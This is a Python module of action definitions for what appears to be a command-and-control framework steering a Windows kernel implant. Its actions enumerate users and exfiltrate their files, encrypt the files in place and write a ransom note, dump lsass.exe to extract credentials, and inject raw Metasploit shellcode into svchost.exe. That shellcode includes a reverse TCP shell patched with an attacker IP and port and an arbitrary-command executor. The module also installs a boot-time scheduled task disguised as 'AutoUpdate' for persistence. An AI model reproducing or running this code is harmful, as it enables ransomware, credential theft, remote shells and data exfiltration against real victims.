import os
from c2.c2_actions import C2Action
import c2.concrete_parsers as c2parsers
import kernel_shellcode_library.customize_shellcode as runtime_patching


def find_local_users():
    commands_list = ["dir \\??\\C:\\Users\\"]
    parser = c2parsers.local_users_parser
    required_facts = []
    name = "Find local users"
    description = "Get a list of non-default local users"
    output_facts = ['local_users', 'target_local_user']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def list_target_local_user_desktop():
    commands_list = ["dir \\??\\C:\\Users\\{target_local_user}\\Desktop\\"]
    parser = c2parsers.generic_dir_parser
    required_facts = ['target_local_user']
    name = "List user desktop"
    description = "Find potentially sensitive files on target user's desktop"
    output_facts = ['staged_files', 'target_file']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def find_sensitive_files():
    commands_list = ["dir \\??\\C:\\Users\\{local_users}\\Desktop\\",
                     "dir \\??\\C:\\Users\\{local_users}\\Documents\\",
                     "dir \\??\\C:\\Users\\{local_users}\\Downloads\\",
                     "dir \\??\\C:\\Users\\{local_users}\\Pictures\\",
                     "dir \\??\\C:\\Users\\{local_users}\\Videos\\"]
    parser = c2parsers.sensitive_files_dir_parser
    required_facts = ['local_users']
    name = "Find sensitive files"
    description = "Find files with sensitive extensions in some well-known folders for all local users (iterative)"
    output_facts = ['staged_files']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    action.iterativeAction()
    return action


def read_file():
    commands_list = ["read {target_file}"]
    parser = c2parsers.generic_file_parser
    required_facts = ['target_file']
    name = "Exfiltrate file"
    description = "Read a file from the victim's file system"
    output_facts = ['exfiltrated_files']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def read_staged_files():
    commands_list = ["read {staged_files}"]
    parser = c2parsers.generic_file_parser
    required_facts = ['staged_files']
    name = "Exfiltrate a list of staged files"
    description = "Read a list of files from the victim's file system; it is an iterative action"
    output_facts = ['exfiltrated_files']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    action.iterativeAction()
    return action


def read_and_encrypt_staged_files():
    commands_list = ["read {staged_files}"]
    parser = c2parsers.file_parsing_and_encryption
    required_facts = ['staged_files']
    name = "Exfiltrate a list of staged files and encrypt them"
    description = "Read a list of files from the victim's file system and encrypt them, preparing the files that " \
                  "will overwrite the original files on the remote file system; it is an iterative action"
    output_facts = ['exfiltrated_files']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    action.iterativeAction()
    return action


def send_encrypted_files():
    commands_list = ["write {staged_files}"]
    parser = c2parsers.null_parser
    required_facts = ['staged_files', 'exfiltrated_files']
    name = "Encrypt remote files"
    description = "Read previously encrypted files, which are the exfiltrated_files with .enc extension, and use " \
                  "them to overwrite the staged_files on the remote file system"
    action = C2Action(commands_list, parser, required_facts, name, description)
    action.iterativeAction()
    return action


def write_ransom_message():
    commands_list = write_file("ransom_message.txt", "\\??\\C:\\Users\\{target_local_user}\\Desktop\\ransom.txt").commandsList
    parser = c2parsers.null_parser
    required_facts = ['target_local_user']
    name = "Write ransom message"
    description = "Write a message asking for ransom on the desktop of the target_local_user (one of the victim users)"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def get_system_version():
    commands_list = ["version"]
    parser = c2parsers.version_parser
    required_facts = []
    name = "Get system version"
    description = "Get major version, minor version and build number"
    output_facts = ['major_version', 'minor_version', 'build_number']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def dump_lsass_process():
    commands_list = ["dump lsass.exe"]
    parser = c2parsers.process_dump_parser_to_minidump
    required_facts = ['major_version', 'minor_version', 'build_number']
    name = "Dump lsass credentials"
    description = "Read a full memory dump of lsass.exe and make a minidump from it " \
                  "to extract credentials"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def write_file(filename=None, target_file=None):
    commands_list = [f"write {target_file}" if target_file is not None else "write {target_file}"]
    if filename is None:
        commands_list.append(b"stub")
    else:
        filename = filename.split('/')[-1]
        with open(os.path.join('/usr/src/app/c2/connections/upload_dir', filename), 'rb') as f:
            data = f.read()
        chunk_size = 1460
        data = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
        for chunk in data:
            commands_list.append(chunk)
    parser = c2parsers.null_parser
    if target_file is None:
        required_facts = ['target_file']
    else:
        required_facts = []
    name = "Write file on remote file system"
    description = "This action reads a file, specified as argument, from the upload_dir, " \
                  "and writes it to remote file system in the path specified by target_file; " \
                  "if the local file is not specified, the action will write 'stub'"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def set_registry_key(key=None, subkey_name=None, subkey_type=None, subkey_value=None):
    args = [key, subkey_name, subkey_type, subkey_value]
    commands_list = [f"setkey {key}" if key is not None else "setkey {reg_key}",
                     subkey_name or "{reg_subkey_name}",
                     subkey_type or "{reg_subkey_type}",
                     subkey_value or "{reg_subkey_value}"]
    parser = c2parsers.null_parser
    complete_required_facts = ['reg_key', 'reg_subkey_name', 'reg_subkey_type', 'reg_subkey_value']
    required_facts = [complete_required_facts[i] for i in range(len(args)) if args[i] is None]
    name = "Set subkey name, type and value in a registry key"
    description = "Open/create a key in the Windows registry, and for that key sets a " \
                  "subkey with specified name, type and value; you can either start this action" \
                  " using facts or passing positional parameters: " \
                  "key_name subkey_name subkey_type subkey_value"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def run_user_mode_shellcode(shellcode_filename=None):
    if shellcode_filename is None:
        commands_list = ["usermode <shellcode_bytes>"]
    else:
        filename = shellcode_filename.split('/')[-1]
        with open(os.path.join('/usr/src/app/c2/connections/upload_dir', filename), 'rb') as f:
            data = f.read()
        data = data[:1451]
        commands_list = [b"usermode " + data]
    parser = c2parsers.null_parser
    required_facts = []
    name = "Run user-mode shellcode"
    description = "Make the kernel agent execute a user-mode shellcode using worker factories, therefore " \
                  "by injecting a worker factory in a svchost.exe process, executing the user-mode " \
                  "shellcode provided as input; this action takes " \
                  "as positional parameter the name of a file in the upload_dir folder"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def run_windows_user_mode_reverse_shell(target_ip=None, target_port=None):
    # ./msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=6000 --arch x64 -f raw
    # with the addition of "ret" (0xc3)
    if target_ip is None or target_port is None:
        commands_list = ["usermode <shellcode_bytes>"]
    else:
        win_x64_rev_shell = b'\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x17\x70\xc0\xa8\x7a\x01\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\xc3'
        ip_offset = 234
        ip_addr_hex = "".join([hex(int(i))[2:].rjust(2, '0') for i in target_ip.split(".")])
        shellcode = runtime_patching.modify(ip_offset, ip_addr_hex, win_x64_rev_shell, swap_bytes=False)
        port_offset = 232
        target_port = int(target_port)
        port_hex = hex(target_port)[2:].rjust(4, '0')
        shellcode = runtime_patching.modify(port_offset, port_hex, shellcode, swap_bytes=False)
        commands_list = [b"usermode " + shellcode]
    parser = c2parsers.null_parser
    required_facts = []
    name = "Inject user-mode reverse shell (Windows x64)"
    description = "Use worker factories to run a user-mode reverse TCP shell; this action requires " \
                  "IP address and port as positional arguments, and will patch the shellcode accordingly"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def run_user_mode_powershell_command(*args):
    # https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/windows/x64/exec.rb
    if len(args) == 0:
        commands_list = ["usermode <shellcode_bytes>"]
    else:
        command = " ".join(args)
        win_x64_exec_command = b'\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5'
        psh_cmd = f'powershell.exe -Command "{command}"'
        shellcode = win_x64_exec_command + psh_cmd.encode() + b'\x00\x00'
        commands_list = [b"usermode " + shellcode]
    parser = c2parsers.null_parser
    required_facts = []
    name = "Inject a powershell command (Windows x64)"
    description = "Inject a user-mode shellcode that calls powershell.exe with a user-provided -Command " \
                  "argument, that is required as positional argument of this action"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def run_user_mode_arbitrary_command(*args):
    # https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/windows/x64/exec.rb
    if len(args) == 0:
        commands_list = ["usermode <shellcode_bytes>"]
    else:
        command = " ".join(args)
        win_x64_exec_command = b'\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5'
        shellcode = win_x64_exec_command + command.encode() + b'\x00\x00'
        commands_list = [b"usermode " + shellcode]
    parser = c2parsers.null_parser
    required_facts = []
    name = "Inject an arbitrary command (Windows x64)"
    description = "Inject a user-mode shellcode that execute an arbitrary user-provided command, " \
                  "that is required as positional argument of this action"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def read_and_parse_arp_cache(target_filename=None):
    if target_filename is None:
        commands_list = ["read {target_file}"]
        required_facts = ['target_file']
    else:
        commands_list = [f"read {target_filename}"]
        required_facts = []
    parser = c2parsers.arp_cache_parser
    name = "Read a file which contains the output of 'arp -a' and parse it"
    description = "Since the file contains the contents of ARP cache, that can be obtained with " \
                  "the 'arp' command, you may want to create that file using an user-mode action; " \
                  "takes target_file also as positional argument"
    output_facts = ['arp_entries']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def read_and_parse_ipconfig(target_filename=None):
    if target_filename is None:
        commands_list = ["read {target_file}"]
        required_facts = ['target_file']
    else:
        commands_list = [f"read {target_filename}"]
        required_facts = []
    parser = c2parsers.ipconfig_parser
    name = "Read a file which contains the output of 'ipconfig' and parse it"
    description = "You may want to create the related file with an user-mode command; the parsing " \
                  "has the purpose of extracting the local IP address of the injected system"
    output_facts = ['local_ip_addr']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def install_schtask():
    commands_list = []
    parser = c2parsers.null_parser
    required_facts = []
    name = "Install a scheduled task on the remote Windows target"
    schtask_cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' \
                       ' -ExecutionPolicy Bypass -Command "& \'C:\\Windows\\System32\\update.ps1\'"'
    description = "The scheduled task installed executes the following command line:\n" + \
                  schtask_cmd_line + "\n" + "It is triggered at boot"
    # TODO: random generate the hard-coded task id
    # TODO: make the task name parametric
    # TODO: compute the task hash according to values (it is sha256(xml_file[2:]) )
    # TODO: customize task_triggers, if needed
    # TODO: is DynamicInfo needed or not for the trigger to work properly?
    # TODO: is it needed to write the XML file in C:\\Windows\\System32\\Tasks ?
    security_descriptor = b'\x01\x00\x04\x80\x78\x00\x00\x00\x88\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x64\x00\x04\x00\x00\x00\x00\x10\x18\x00\x9f\x01\x1f\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00\x00\x10\x14\x00\x9f\x01\x1f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00\x00\x10\x18\x00\xff\x01\x1f\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00\x00\x00\x14\x00\x89\x00\x12\x00\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xa0\xda\x06\x43\x75\x7d\x9d\x47\xd6\x2d\x25\x3a\x01\x02\x00\x00'
    task_id = "{5425CA0C-6B59-4BA8-ABB0-B84A4C4E22D9}"
    task_name = "\\AutoUpdate"   # trailing slash needed
    task_hash = b'\xf1\xbe\xf4\xd3\xaa\x35\x41\xe4\x39\x1d\x37\x47\xa3\xad\x68\xf4\x6c\x43\x84\xac\x2e\x25\x7c\x16\x01\xe0\x5d\x0d\xe1\xac\x7c\xd5'
    # task_date = "2022-09-16T15:41:23.4981941"
    # task_author = "WIN10\\admin"
    # task_description = "Default Windows System Update"
    task_triggers = b'\x17\x00\x00\x00\x00\x00\x00\x00\x00\xd9\x47\xed\xc3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd9\x47\xed\xc3\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x38\x21\x41\x43\x48\x48\x48\x48\x43\x2e\x69\xf5\x48\x48\x48\x48\x0e\x00\x00\x00\x48\x48\x48\x48\x41\x00\x75\x00\x74\x00\x68\x00\x6f\x00\x72\x00\x00\x00\x48\x48\x00\x00\x00\x00\x48\x48\x48\x48\x00\x48\x48\x48\x48\x48\x48\x48\x00\x48\x48\x48\x48\x48\x48\x48\x01\x00\x00\x00\x48\x48\x48\x48\x1c\x00\x00\x00\x48\x48\x48\x48\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xa0\xda\x06\x43\x75\x7d\x9d\x47\xd6\x2d\x25\x3a\xe8\x03\x00\x00\x48\x48\x48\x48\x18\x00\x00\x00\x48\x48\x48\x48\x57\x00\x49\x00\x4e\x00\x31\x00\x30\x00\x5c\x00\x61\x00\x64\x00\x6d\x00\x69\x00\x6e\x00\x00\x00\x2c\x00\x00\x00\x48\x48\x48\x48\x00\x00\x00\x00\xff\xff\xff\xff\x80\xf4\x03\x00\xff\xff\xff\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x48\x48\x48\xff\xff\x00\x00\x00\x00\x00\x00\x00\xd9\x47\xed\xc3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd9\x47\xed\xc3\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x48\x48\x48'
    task_actions = b'\x03\x00\x0c\x00\x00\x00\x41\x00\x75\x00\x74\x00\x68\x00\x6f\x00\x72\x00\x66\x66\x00\x00\x00\x00\x72\x00\x00\x00\x43\x00\x3a\x00\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x5c\x00\x53\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x50\x00\x6f\x00\x77\x00\x65\x00\x72\x00\x53\x00\x68\x00\x65\x00\x6c\x00\x6c\x00\x5c\x00\x76\x00\x31\x00\x2e\x00\x30\x00\x5c\x00\x70\x00\x6f\x00\x77\x00\x65\x00\x72\x00\x73\x00\x68\x00\x65\x00\x6c\x00\x6c\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x8a\x00\x00\x00\x2d\x00\x45\x00\x78\x00\x65\x00\x63\x00\x75\x00\x74\x00\x69\x00\x6f\x00\x6e\x00\x50\x00\x6f\x00\x6c\x00\x69\x00\x63\x00\x79\x00\x20\x00\x42\x00\x79\x00\x70\x00\x61\x00\x73\x00\x73\x00\x20\x00\x2d\x00\x43\x00\x6f\x00\x6d\x00\x6d\x00\x61\x00\x6e\x00\x64\x00\x20\x00\x22\x00\x26\x00\x20\x00\x27\x00\x43\x00\x3a\x00\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x5c\x00\x53\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x75\x00\x70\x00\x64\x00\x61\x00\x74\x00\x65\x00\x2e\x00\x70\x00\x73\x00\x31\x00\x27\x00\x22\x00\x00\x00\x00\x00\x00\x00'
    # task_dynamic_info = b'\x03\x00\x00\x00\x9c\xd9\xe3\x02\xd2\xc9\xd8\x01\x34\xe4\xe9\x02\xd2\xc9\xd8\x01\x00\x00\x00\x00\x00\x00\x00\x00\x79\xa4\x29\x05\xd2\xc9\xd8\x01'
    reg_task_index = "\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT" \
                     "\\CurrentVersion\\Schedule\\TaskCache\\Tree" + task_name
    reg_task_data = "\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT" \
                    "\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\" + task_id
    sub_action = set_registry_key(reg_task_index, "Id", "REG_SZ", task_id)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_index, "Index", "REG_DWORD", "3")
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_index, "SD", "REG_BINARY", security_descriptor)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Path", "REG_SZ", task_name)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Hash", "REG_BINARY", task_hash)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Schema", "REG_DWORD", "65540")    # 0x10004
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Version", "REG_SZ", "1.0")
    commands_list += sub_action.commandsList
    """
    sub_action = set_registry_key(reg_task_data, "Date", "REG_SZ", task_date)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Author", "REG_SZ", task_author)
    commands_list += sub_action.commandsList
    
    sub_action = set_registry_key(reg_task_data, "Description", "REG_SZ", task_description)
    commands_list += sub_action.commandsList
    """
    sub_action = set_registry_key(reg_task_data, "URI", "REG_SZ", task_name)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Triggers", "REG_BINARY", task_triggers)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Actions", "REG_BINARY", task_actions)
    commands_list += sub_action.commandsList
    """
    sub_action = set_registry_key(reg_task_data, "DynamicInfo", "REG_BINARY", task_dynamic_info)
    commands_list += sub_action.commandsList
    """
    try:
        sub_action = write_file("schtask.xml", "\\??\\C:\\Windows\\System32\\Tasks" + task_name)
        commands_list += sub_action.commandsList
    except FileNotFoundError:
        pass
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action
